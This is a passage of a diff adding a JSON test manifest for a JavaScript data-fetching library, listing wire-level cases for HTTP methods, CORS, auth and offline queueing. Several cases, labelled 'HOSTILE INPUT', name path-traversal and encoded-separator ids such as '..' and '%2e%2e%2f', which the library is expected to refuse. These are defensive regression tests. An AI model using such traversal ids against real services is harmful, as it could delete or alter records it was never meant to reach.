@@ -1,0 +1,1725 @@
+{
+  "description": "Wire-level call-pattern matrix (FIX_PLAN.md \u00a75). Every case here MUST be executed exactly once by scripts/wire/run.mjs and produce a recorded pass/fail result \u2014 a case declared here but never executed by a driver is itself a suite failure (T1: 'CANNOT silently skip'). The floor on case count is enforced independently in scripts/wire/run.mjs (not read from this file), so an empty or truncated manifest cannot pass trivially (QA binding finding 3).",
+  "cases": [
+    {
+      "id": "b1-mutate-post-provider-cjs",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "useMinder().mutate()",
+      "module": "cjs",
+      "description": "object route declared POST, useMinder(route).mutate(data) inside MinderDataProvider must send POST, never GET-with-body"
+    },
+    {
+      "id": "b1-mutate-put-provider-esm",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "useMinder().mutate()",
+      "module": "esm",
+      "description": "declared PUT route must send PUT on the wire"
+    },
+    {
+      "id": "b1-mutate-patch-provider-cjs",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "useMinder().mutate()",
+      "module": "cjs",
+      "description": "declared PATCH route must send PATCH on the wire"
+    },
+    {
+      "id": "b1-mutate-delete-provider-esm",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "useMinder().mutate()",
+      "module": "esm",
+      "description": "declared DELETE route must send DELETE on the wire"
+    },
+    {
+      "id": "b1-operations-create-provider-esm",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "operations.create",
+      "module": "esm",
+      "description": "operations.create() must send the route's declared POST method"
+    },
+    {
+      "id": "b1-operations-update-provider-cjs",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "operations.update",
+      "module": "cjs",
+      "description": "operations.update() must send the route's declared PUT method"
+    },
+    {
+      "id": "b1-operations-delete-provider-esm",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "operations.delete",
+      "module": "esm",
+      "description": "operations.delete() must send the route's declared DELETE method"
+    },
+    {
+      "id": "b1-standalone-explicit-method-cjs",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "minder()",
+      "module": "cjs",
+      "description": "standalone minder(url, data, { method: 'PUT' }) must send PUT"
+    },
+    {
+      "id": "b1-standalone-registry-method-esm",
+      "acceptance": "B1",
+      "driver": "method-contract",
+      "pattern": "minder()",
+      "module": "esm",
+      "description": "standalone minder('routeName', data) resolving a registered PUT route must send PUT, not fall back to POST/GET"
+    },
+    {
+      "id": "b2-standalone-sanitization-disabled-by-default-passthrough",
+      "acceptance": "B2",
+      "driver": "sanitization-contract",
+      "pattern": "minder()",
+      "module": "cjs",
+      "description": "standalone minder() with no security.sanitization config sends the body byte-for-byte unmodified"
+    },
+    {
+      "id": "h3-sanitization-optin-field-strips-script-tag",
+      "acceptance": "H3",
+      "driver": "sanitization-contract",
+      "pattern": "minder()",
+      "module": "cjs",
+      "description": "an explicitly opted-in field containing markup is actually sanitized on the wire"
+    },
+    {
+      "id": "h3-sanitization-non-optin-field-preserves-ampersand",
+      "acceptance": "H3",
+      "driver": "sanitization-contract",
+      "pattern": "minder()",
+      "module": "cjs",
+      "description": "a field NOT in the opt-in list keeps an ordinary '&' un-mangled on the wire (the H3 corruption bug)"
+    },
+    {
+      "id": "h2-sanitize-fails-closed-outside-browser",
+      "acceptance": "H2",
+      "driver": "h2-node-runtime",
+      "pattern": "XSSSanitizer.sanitize (no window)",
+      "module": "cjs",
+      "description": "in a real windowless Node child process, sanitize() either throws SANITIZER_UNAVAILABLE or the claim is provably false \u2014 no silent weak-regex fallback"
+    },
+    {
+      "id": "b3-useauthtoken-no-provider-does-not-throw",
+      "acceptance": "B3",
+      "driver": "auth-hooks-contract",
+      "pattern": "useAuthToken()",
+      "module": "cjs",
+      "description": "useAuthToken() rendered with no MinderDataProvider ancestor must not throw"
+    },
+    {
+      "id": "h5-useauth-legacy-setToken-throws-directed-error",
+      "acceptance": "H5",
+      "driver": "auth-hooks-contract",
+      "pattern": "useAuth().setToken",
+      "module": "cjs",
+      "description": "calling the legacy token-store method name on the root capability-contract useAuth() throws an error naming useAuthToken, never silently undefined"
+    },
+    {
+      "id": "h1-setToken-undefined-rejected",
+      "acceptance": "H1",
+      "driver": "auth-fail-closed",
+      "pattern": "AuthManager.setToken",
+      "module": "cjs",
+      "description": "setToken(undefined) throws and does not leave isAuthenticated() true"
+    },
+    {
+      "id": "h1-setToken-literal-string-undefined-rejected",
+      "acceptance": "H1",
+      "driver": "auth-fail-closed",
+      "pattern": "AuthManager.setToken",
+      "module": "cjs",
+      "description": "setToken('undefined') (the literal string) is rejected"
+    },
+    {
+      "id": "h1-setToken-literal-string-null-rejected",
+      "acceptance": "H1",
+      "driver": "auth-fail-closed",
+      "pattern": "AuthManager.setToken",
+      "module": "cjs",
+      "description": "setToken('null') (the literal string) is rejected"
+    },
+    {
+      "id": "b4-configureMinder-web-cors-not-autoenabled",
+      "acceptance": "B4",
+      "driver": "config-cors-contract",
+      "pattern": "configureMinder()",
+      "module": "cjs",
+      "description": "configureMinder({apiUrl}) on the web platform does not silently produce cors.enabled:true with no proxy configured"
+    },
+    {
+      "id": "m3-platform-web-configureMinder-registers-routes",
+      "acceptance": "M3",
+      "driver": "config-cors-contract",
+      "pattern": "configureMinder() via /web",
+      "module": "esm",
+      "description": "configureMinder imported from minder-data-provider/web resolves to the real implementation (registers routes.*), not the deprecated core stub"
+    },
+    {
+      "id": "m4-cors-credentials-with-wildcard-regex-rejected",
+      "acceptance": "M4",
+      "driver": "cors-guard",
+      "pattern": "createCorsMiddleware()",
+      "module": "cjs",
+      "description": "credentials:true combined with a trivially-matching RegExp origin is rejected, never reflected with Access-Control-Allow-Credentials"
+    },
+    {
+      "id": "m4-cors-wildcard-inside-array-treated-as-wildcard",
+      "acceptance": "M4",
+      "driver": "cors-guard",
+      "pattern": "createCorsMiddleware()",
+      "module": "cjs",
+      "description": "an origin array containing '*' is treated as a wildcard (both for the credentials guard and for emitting CORS headers)"
+    },
+    {
+      "id": "c1-standalone-mutate-dead-port-reports-failure",
+      "acceptance": "C1",
+      "driver": "method-contract",
+      "pattern": "useMinder().mutate() (standalone, no provider)",
+      "module": "cjs",
+      "description": "FAILURE PATH: a standalone (no-provider) mutate() against a dead port reports success:false at the TOP level, with a real error and data:null \u2014 not success:true wrapping an inner MinderResult"
+    },
+    {
+      "id": "c2-standalone-delete-carries-body",
+      "acceptance": "C2",
+      "driver": "method-contract",
+      "pattern": "minder(url, data, { method: 'DELETE' })",
+      "module": "cjs",
+      "description": "standalone minder() sends the request body on a DELETE, matching the provider/ApiClient path instead of silently dropping it"
+    },
+    {
+      "id": "c4-mount-mutating-route-does-not-autofetch",
+      "acceptance": "C4",
+      "driver": "method-contract",
+      "pattern": "useMinder('createUser') (route declares POST)",
+      "module": "esm",
+      "description": "mounting a hook whose route declares a mutating verb fires ZERO requests before any explicit mutate()/operations call"
+    },
+    {
+      "id": "c5-operations-delete-no-id-placeholder-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete(id)",
+      "module": "cjs",
+      "description": "FAILURE PATH: operations.delete(id) on a route with no ':id' placeholder and no delete-sibling THROWS a directed error and never sends a collection-shaped DELETE (zero requests reach the wire)"
+    },
+    {
+      "id": "c5-id-route-no-redundant-query-param",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "useMinder(route, { params: { id } })",
+      "module": "esm",
+      "description": "a ':id' route substitutes the id into the URL path with no redundant '?id=' query string appended"
+    },
+    {
+      "id": "c5-delete-empty-string-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete('')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT: operations.delete('') on a route with an ':id' placeholder THROWS before dispatch instead of substituting an empty segment (collection-shaped DELETE) \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-traversal-dotdot-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete('..')",
+      "module": "esm",
+      "description": "HOSTILE INPUT (catastrophic): operations.delete('..') THROWS before dispatch instead of letting '..' walk the URL toward server ROOT \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-null-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete(null)",
+      "module": "cjs",
+      "description": "HOSTILE INPUT: operations.delete(null) THROWS before dispatch instead of String()-coercing to the literal id 'null' \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-undefined-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete(undefined)",
+      "module": "esm",
+      "description": "HOSTILE INPUT: operations.delete(undefined) THROWS before dispatch instead of String()-coercing to the literal id 'undefined' \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-nan-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete(NaN)",
+      "module": "cjs",
+      "description": "HOSTILE INPUT: operations.delete(NaN) THROWS before dispatch instead of String()-coercing to the literal id 'NaN' \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-whitespace-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete('   ')",
+      "module": "esm",
+      "description": "HOSTILE INPUT: operations.delete('   ') (whitespace-only) THROWS before dispatch \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-embedded-slash-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete('5/6')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT: operations.delete('5/6') (embedded path separator) THROWS before dispatch instead of letting the id escape its URL segment \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-backslash-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete('a\\\\b')",
+      "module": "esm",
+      "description": "HOSTILE INPUT: operations.delete('a\\\\b') (backslash separator) THROWS before dispatch \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-encoded-dotdot-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete('%2e%2e%2f')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (encoded traversal): operations.delete('%2e%2e%2f') THROWS before dispatch \u2014 a percent-encoded '../' must not sneak past the raw-string check and get decoded downstream \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-delete-encoded-slash-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.delete('a%2fb')",
+      "module": "esm",
+      "description": "HOSTILE INPUT (encoded separator): operations.delete('a%2fb') THROWS before dispatch \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-update-empty-string-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.update('', item)",
+      "module": "cjs",
+      "description": "HOSTILE INPUT: operations.update('', item) THROWS before dispatch instead of substituting an empty segment \u2014 update() must never CREATE \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-update-traversal-dotdot-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.update('..', item)",
+      "module": "esm",
+      "description": "HOSTILE INPUT (catastrophic): operations.update('..', item) THROWS before dispatch instead of letting '..' walk the URL toward server ROOT \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-update-null-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.update(null, item)",
+      "module": "cjs",
+      "description": "HOSTILE INPUT: operations.update(null, item) THROWS before dispatch instead of String()-coercing to the literal id 'null' \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-update-undefined-id-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "operations.update(undefined, item)",
+      "module": "esm",
+      "description": "HOSTILE INPUT: operations.update(undefined, item) THROWS before dispatch \u2014 update() must never silently degrade to a CREATE \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-adhoc-delete-no-id-placeholder-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "useMinder(rawUrl).operations.delete(id)",
+      "module": "cjs",
+      "description": "AD-HOC BYPASS: useMinder('/things-adhoc').operations.delete(7) \u2014 a raw/ad-hoc URL with no ':id' placeholder \u2014 THROWS before dispatch instead of silently degrading to a bodyless GET with the id dropped (the wrong verb) \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-adhoc-update-no-id-placeholder-refuses",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "useMinder(rawUrl).operations.update(id, item)",
+      "module": "esm",
+      "description": "AD-HOC BYPASS: useMinder('/things-adhoc').operations.update(7, item) \u2014 a raw/ad-hoc URL with no ':id' placeholder \u2014 THROWS before dispatch instead of silently sending a body-carrying POST that CREATES a record \u2014 zero requests reach the wire"
+    },
+    {
+      "id": "c5-adhoc-delete-with-id-placeholder-resolves",
+      "acceptance": "C5",
+      "driver": "method-contract",
+      "pattern": "useMinder(rawUrl-with-id).operations.delete(id)",
+      "module": "cjs",
+      "description": "AD-HOC POSITIVE PATH: useMinder('/things-adhoc-id/:id').operations.delete('9') \u2014 a raw/ad-hoc URL that DOES carry an ':id' placeholder \u2014 resolves correctly and sends DELETE /things-adhoc-id/9, proving the ad-hoc fix resolves rather than only ever throwing"
+    },
+    {
+      "id": "n1-golden-path-mount-autofetch-resolves-to-collection",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('gpItem') mounted with DEFAULT options (no autoFetch:false)",
+      "module": "esm",
+      "description": "GOLDEN PATH, PROPERLY CLOSED: the SAME single ':id' route mounted with ZERO extra options \u2014 the hook itself validates and its own mount-time auto-fetch resolves to the COLLECTION form (GET /gp-items), proving computeRouteValidation no longer requires the autoFetch:false workaround for operations to even exist"
+    },
+    {
+      "id": "n1-golden-path-fetch-resolves-to-collection",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('gpItem').operations.fetch()",
+      "module": "esm",
+      "description": "GOLDEN PATH: ONE route registered as { method: 'GET', url: '/gp-items/:id' } (no siblings) \u2014 operations.fetch() resolves to the COLLECTION form and sends GET /gp-items, never the literal unresolved ':id' token"
+    },
+    {
+      "id": "n1-golden-path-create-resolves-to-collection",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('gpItem').operations.create(item)",
+      "module": "esm",
+      "description": "GOLDEN PATH: the SAME single ':id' route \u2014 operations.create(item) resolves to the COLLECTION form and sends POST /gp-items, never the literal unresolved ':id' token (previously sent POST /gp-items/:id)"
+    },
+    {
+      "id": "n1-golden-path-update-substitutes-id",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('gpItem').operations.update(id, item)",
+      "module": "esm",
+      "description": "GOLDEN PATH: the SAME single ':id' route \u2014 operations.update('42', item) KEEPS substituting the id (C5 unmodified) and sends PUT /gp-items/42"
+    },
+    {
+      "id": "n1-golden-path-delete-substitutes-id",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('gpItem').operations.delete(id)",
+      "module": "esm",
+      "description": "GOLDEN PATH: the SAME single ':id' route \u2014 operations.delete('42') KEEPS substituting the id (C5 unmodified) and sends DELETE /gp-items/42 \u2014 proves ONE registered route now serves the full create/fetch/update(id)/delete(id) contract"
+    },
+    {
+      "id": "n1-no-id-placeholder-update-still-refuses",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('thingsNoId').operations.update(id, item)",
+      "module": "cjs",
+      "description": "REGRESSION GUARD: a route with NO ':id' placeholder anywhere and no sibling (e.g. { url: '/things-no-id' }) still THROWS on operations.update(id, ...) exactly like it already does for delete() \u2014 proves the N1 Golden Path fix did not loosen the C5 guard for the genuinely unaddressable case"
+    },
+    {
+      "id": "n4-handbuilt-shorthand-fetch-resolves",
+      "acceptance": "N4",
+      "driver": "method-contract",
+      "pattern": "useMinder('things').operations.fetch() (hand-built config)",
+      "module": "cjs",
+      "description": "N4: a HAND-BUILT MinderConfig (never passed through configureMinder()) using the documented shorthand STRING route form ({ things: '/things' }) \u2014 operations.fetch() resolves and sends GET /things instead of crashing"
+    },
+    {
+      "id": "n4-handbuilt-shorthand-create-resolves",
+      "acceptance": "N4",
+      "driver": "method-contract",
+      "pattern": "useMinder('things').operations.create(item) (hand-built config)",
+      "module": "cjs",
+      "description": "N4: the SAME hand-built shorthand-string route \u2014 operations.create(item) resolves and sends POST /things instead of crashing"
+    },
+    {
+      "id": "n4-handbuilt-shorthand-update-resolves",
+      "acceptance": "N4",
+      "driver": "method-contract",
+      "pattern": "useMinder('things').operations.update(id, item) (hand-built config)",
+      "module": "cjs",
+      "description": "N4: the SAME hand-built shorthand-string route \u2014 operations.update('9', item) resolves and sends PUT /things/9 instead of crashing with a bare TypeError (reading .url off a string primitive)"
+    },
+    {
+      "id": "n4-handbuilt-shorthand-delete-resolves",
+      "acceptance": "N4",
+      "driver": "method-contract",
+      "pattern": "useMinder('things').operations.delete(id) (hand-built config)",
+      "module": "cjs",
+      "description": "N4: the SAME hand-built shorthand-string route \u2014 operations.delete('9') resolves and sends DELETE /things/9 instead of crashing with a bare TypeError (reading .url off a string primitive)"
+    },
+    {
+      "id": "n1-readme-golden-path-verbatim-autofetch",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('users') \u2014 README Golden Path snippet, verbatim, default options",
+      "module": "cjs",
+      "description": "HEADLINE ACCEPTANCE TEST: routes:{ users: '/gp-users' } (documented shorthand-STRING form, auto-expanded into base+CRUD-sibling routes) \u2014 mounting useMinder('users') with ZERO extra options auto-fetches GET /gp-users on mount"
+    },
+    {
+      "id": "n1-readme-golden-path-verbatim-create",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('users').operations.create(...) \u2014 README Golden Path, verbatim",
+      "module": "cjs",
+      "description": "HEADLINE ACCEPTANCE TEST: const { operations } = useMinder('users'); operations.create({name:'Ada'}) sends POST /gp-users with no autoFetch:false workaround"
+    },
+    {
+      "id": "n1-readme-golden-path-verbatim-update",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('users').operations.update(id, ...) \u2014 README Golden Path, verbatim",
+      "module": "cjs",
+      "description": "HEADLINE ACCEPTANCE TEST: operations.update('7', {...}) sends PUT /gp-users/7 with no autoFetch:false workaround"
+    },
+    {
+      "id": "n1-readme-golden-path-verbatim-delete",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('users').operations.delete(id) \u2014 README Golden Path, verbatim",
+      "module": "cjs",
+      "description": "HEADLINE ACCEPTANCE TEST: operations.delete('7') sends DELETE /gp-users/7 with no autoFetch:false workaround \u2014 the full documented Golden Path snippet, verbatim, all four operations correct on the wire"
+    },
+    {
+      "id": "critical-lowercase-method-create-sends-post",
+      "acceptance": "CRITICAL",
+      "driver": "method-contract",
+      "pattern": "useMinder(route-with-method:'get').operations.create(item)",
+      "module": "esm",
+      "description": "CRITICAL \u2014 case-sensitive method comparison: a route declared { method: 'get', url: '<base>/:id' } (lowercase, no sibling) \u2014 operations.create() must still resolve to POST <base>, not the route's own (wrongly case-mismatched) verb"
+    },
+    {
+      "id": "critical-lowercase-method-update-sends-put",
+      "acceptance": "CRITICAL",
+      "driver": "method-contract",
+      "pattern": "useMinder(route-with-method:'get').operations.update(id, item)",
+      "module": "esm",
+      "description": "CRITICAL \u2014 the SAME lowercase-'get' route \u2014 operations.update('5', item) must send PUT <base>/5, not GET"
+    },
+    {
+      "id": "critical-lowercase-method-delete-sends-delete",
+      "acceptance": "CRITICAL",
+      "driver": "method-contract",
+      "pattern": "useMinder(route-with-method:'get').operations.delete(id)",
+      "module": "esm",
+      "description": "CRITICAL \u2014 the SAME lowercase-'get' route \u2014 operations.delete('5') must send DELETE <base>/5, not GET"
+    },
+    {
+      "id": "critical-lowercase-method-sibling-redirect-sends-post",
+      "acceptance": "CRITICAL",
+      "driver": "method-contract",
+      "pattern": "useMinder(base-route-with-method:'GeT').operations.create(item), WITH a registered POST sibling",
+      "module": "cjs",
+      "description": "CRITICAL \u2014 a DIFFERENT code path: a base route declared method:'GeT' (mixed case) WITH a registered create-sibling must still be redirected to that sibling (POST) instead of being treated as already-explicit non-GET and dispatched unchanged"
+    },
+    {
+      "id": "critical-lowercase-method-handbuilt-config-create-sends-post",
+      "acceptance": "CRITICAL",
+      "driver": "method-contract",
+      "pattern": "useMinder(route-with-method:'get').operations.create(item), on a HAND-BUILT config (never passed through configureMinder())",
+      "module": "esm",
+      "description": "CRITICAL \u2014 defense in depth, isolated: configureMinder()'s own method-case normalization (src/config/index.ts) never runs for a genuinely hand-built config (N4 precedent), so this scenario can ONLY be saved by the COMPARISON-SITE normalizeMethod in useMinder.helpers.ts \u2014 proves that defense holds on its own"
+    },
+    {
+      "id": "medium-repeated-id-placeholder-both-substituted",
+      "acceptance": "MEDIUM",
+      "driver": "method-contract",
+      "pattern": "useMinder('/mirror/:id/vs/:id').operations.update(id, item)",
+      "module": "esm",
+      "description": "MEDIUM \u2014 non-global ':id' replace: a route using the SAME ':id' placeholder TWICE \u2014 operations.update('42', ...) must substitute BOTH occurrences (PUT /mirror/42/vs/42), not just the first (a non-global string .replace() previously left the second literal)"
+    },
+    {
+      "id": "medium-nonterminal-id-route-still-requires-params",
+      "acceptance": "MEDIUM",
+      "driver": "method-contract",
+      "pattern": "useMinder(route-with-nonterminal-':id') mounted with default options",
+      "module": "cjs",
+      "description": "REGRESSION GUARD: a route with a NON-TERMINAL ':id' ('/nested-items/:id/comments', a nested sub-resource) mounted with default options must STILL be flagged invalid (operations undefined) \u2014 proves the Golden Path collection-form exemption applies ONLY to a TERMINAL ':id', never silently fabricating a nonsense URL like '/nested-items/comments'"
+    },
+    {
+      "id": "n1-golden-path-other-placeholder-still-required",
+      "acceptance": "N1",
+      "driver": "method-contract",
+      "pattern": "useMinder('/orgs/:orgId/items/:id') mounted with default options",
+      "module": "esm",
+      "description": "REGRESSION GUARD: a GET route whose TERMINAL ':id' is strippable but an EARLIER ':orgId' placeholder would still be unresolved afterward \u2014 must STILL be flagged invalid by default, proving the Golden Path validation exemption does not over-broaden past routes that genuinely need MORE than just the id"
+    },
+    {
+      "id": "high-collection-form-create-preserves-route-headers",
+      "acceptance": "HIGH",
+      "driver": "method-contract",
+      "pattern": "useMinder(route-with-headers).operations.create(item) \u2014 collection-form (id-stripped) dispatch",
+      "module": "cjs",
+      "description": "HIGH \u2014 raw-path dispatch previously dropped route configuration: a Golden Path route declaring a custom header \u2014 operations.create() (which dispatches through the collection-form urlOverride) must still send that header on the wire, proving dispatch stays THROUGH the registered route instead of bypassing it as an unregistered raw path"
+    },
+    {
+      "id": "high-collection-form-fetch-preserves-route-headers",
+      "acceptance": "HIGH",
+      "driver": "method-contract",
+      "pattern": "useMinder(route-with-headers).operations.fetch() \u2014 collection-form (id-stripped) dispatch",
+      "module": "cjs",
+      "description": "HIGH \u2014 the SAME route \u2014 operations.fetch() (the GET/query-side collection-form resolution) must also send the route's custom header on the wire"
+    },
+    {
+      "id": "rr-concurrent-creates-produce-two-posts",
+      "acceptance": "RR",
+      "driver": "method-contract",
+      "pattern": "Promise.all([operations.create({}), operations.create({})]) \u2014 GET base route, method-override dispatch",
+      "module": "esm",
+      "description": "ResolvedRequest REDESIGN headline test: two concurrent operations.create() calls must produce TWO POSTs \u2014 the old dedup/cache-key gating re-read the DECLARED route.method ('GET') instead of the RESOLVED/dispatched method ('POST'), collapsing both into one request"
+    },
+    {
+      "id": "rr-concurrent-refetch-and-create-both-reach-wire",
+      "acceptance": "RR",
+      "driver": "method-contract",
+      "pattern": "Promise.all([refetch(), operations.create({})]) \u2014 SAME collection route",
+      "module": "cjs",
+      "description": "ResolvedRequest REDESIGN headline test (worst observed failure mode): concurrent refetch() (real GET) and operations.create({}) (dispatches POST) on the same base route must both independently reach the wire \u2014 previously they computed the IDENTICAL cache key and create() could be silently satisfied by refetch()'s cached GET, sending ZERO POSTs while still reporting success:true"
+    },
+    {
+      "id": "rr-untrimmed-method-handbuilt-dispatches",
+      "acceptance": "RR",
+      "driver": "method-contract",
+      "pattern": "useMinder(route).mutate() \u2014 hand-built config, route declared method:'POST '",
+      "module": "esm",
+      "description": "ResolvedRequest REDESIGN headline test: an untrimmed hand-built route method ('POST ' with trailing whitespace, never normalized by configureMinder()) must dispatch a clean POST instead of throwing a raw TypeError with zero requests reaching the wire"
+    },
+    {
+      "id": "rr-p11-repeated-terminal-placeholder-refuses",
+      "acceptance": "RR",
+      "driver": "method-contract",
+      "pattern": "useMinder('GET /p11/:id/mirror/:id') mounted with default options",
+      "module": "cjs",
+      "description": "ResolvedRequest REDESIGN / P11: a route with a REPEATED ':id' placeholder (terminal AND non-terminal) must never be silently collapsed by stripping BOTH occurrences (fabricating '/p11/mirror') \u2014 must stay INVALID (zero requests, a clear 'requires parameters' error) instead"
+    },
+    {
+      "id": "rr-p11-create-unresolvable-collection-refuses",
+      "acceptance": "RR",
+      "driver": "method-contract",
+      "pattern": "operations.create({}) on a route with a REPEATED ':id' placeholder",
+      "module": "esm",
+      "description": "ResolvedRequest REDESIGN / P11: operations.create() (exposed regardless of overall route validity) must itself refuse a route whose collection form still carries an unresolved placeholder after stripping just the terminal ':id' \u2014 a directed throw, zero requests, never a fabricated or literally-unresolved URL"
+    },
+    {
+      "id": "p1-nextjs-server-minder-no-provider-succeeds",
+      "acceptance": "P1",
+      "driver": "platform-contract",
+      "pattern": "minder() (fresh process, no provider)",
+      "module": "esm",
+      "description": "standalone minder(), called first thing in a fresh module graph with nothing else having run, completes a real round trip instead of crashing on the cross-entry singleton store"
+    },
+    {
+      "id": "p1-nextjs-server-minder-no-provider-dead-port-clean-network-error",
+      "acceptance": "P1",
+      "driver": "platform-contract",
+      "pattern": "minder() (fresh process, no provider)",
+      "module": "esm",
+      "description": "FAILURE PATH: standalone minder() against a dead port, from a fresh module graph, reports a genuine NETWORK_ERROR \u2014 not the singleton-store TypeError masquerading as an UNKNOWN_ERROR"
+    },
+    {
+      "id": "p1-nextjs-useauthtoken-no-provider-no-crash",
+      "acceptance": "P1",
+      "driver": "platform-contract",
+      "pattern": "useAuthToken() (fresh process, no provider)",
+      "module": "esm",
+      "description": "useAuthToken(), rendered with no MinderDataProvider ancestor in a fresh module graph, does not throw and returns isLoggedIn:false"
+    },
+    {
+      "id": "p1-nextjs-zero-config-usemander-no-provider-no-crash",
+      "acceptance": "P1",
+      "driver": "platform-contract",
+      "pattern": "useMinder(url) (fresh process, no provider)",
+      "module": "esm",
+      "description": "zero-config useMinder(url), no configureMinder call, no provider, in a fresh module graph, renders and fetches real data with no crash \u2014 the README's headline example"
+    },
+    {
+      "id": "p2-transport-fetch-honored-under-provider",
+      "acceptance": "P2",
+      "driver": "platform-contract",
+      "pattern": "useMinder().mutate() with config.transport:'fetch'",
+      "module": "esm",
+      "description": "transport:'fetch' under a PROVIDER dispatches via native fetch() and never calls axios's own .request(), completing a real round trip"
+    },
+    {
+      "id": "p2-transport-fetch-simulated-workerd-rejects-cache-field",
+      "acceptance": "P2",
+      "driver": "platform-contract",
+      "pattern": "useMinder().mutate() with config.transport:'fetch'",
+      "module": "cjs",
+      "description": "SIMULATED bare workerd (fetch stub throws on any RequestInit.cache field, per the wave brief's own fallback instruction): the native-fetch dispatch never sets 'cache' and the request still completes"
+    },
+    {
+      "id": "p2-transport-fetch-dead-port-reports-clean-network-error",
+      "acceptance": "P2",
+      "driver": "platform-contract",
+      "pattern": "useMinder().mutate() with config.transport:'fetch'",
+      "module": "esm",
+      "description": "FAILURE PATH: transport:'fetch' under a provider against a dead port reports a clean failure result \u2014 no crash, no hang, no unhandled rejection"
+    },
+    {
+      "id": "c3-provider-mutate-dead-port-reports-failure-and-enqueues",
+      "acceptance": "C3",
+      "driver": "offline-contract",
+      "pattern": "useMinder().mutate() with offline:{enabled:true}",
+      "module": "esm",
+      "description": "FAILURE PATH: mutate() against a REAL dead port, under a provider with offline support enabled, reports success:false (C1 still holds) AND the failed mutation lands in getOfflineManager()'s queue \u2014 the auto-queue path was previously dead code for every real axios failure"
+    },
+    {
+      "id": "c3-queued-request-replays-on-sync-against-real-server",
+      "acceptance": "C3",
+      "driver": "offline-contract",
+      "pattern": "getOfflineManager().sync()",
+      "module": "esm",
+      "description": "the request auto-queued by a real dead-port failure REPLAYS correctly once a real server comes up on the same port \u2014 mgr.sync() delivers it and drains the queue back to 0, not just 'queue size went up'"
+    },
+    {
+      "id": "c3-no-offline-config-dead-port-stays-plain-network-error",
+      "acceptance": "C3",
+      "driver": "offline-contract",
+      "pattern": "useMinder().mutate() (no offline config)",
+      "module": "cjs",
+      "description": "HOSTILE INPUT / regression guard: the SAME real dead-port failure with NO offline config at all still reports a plain NETWORK_ERROR and never starts queueing \u2014 the broadened no-response classification is gated on offline support actually being enabled"
+    },
+    {
+      "id": "c3-get-request-dead-port-is-not-auto-queued",
+      "acceptance": "C3",
+      "driver": "offline-contract",
+      "pattern": "useMinder().mutate(undefined, { method: 'GET' }) with offline:{enabled:true}",
+      "module": "esm",
+      "description": "HOSTILE INPUT: a real dead-port failure for a GET-method request, with offline support enabled, is NEVER auto-queued \u2014 only mutations are queueable"
+    },
+    {
+      "id": "f1-delete-fragment-escapes-to-parent-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('5#')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (adversarial re-probe): route /t/:id/comments, operations.delete('5#') previously escaped the URL segment and sent DELETE /t/5 (deleting the PARENT record) \u2014 must now THROW before dispatch, zero requests reach the wire"
+    },
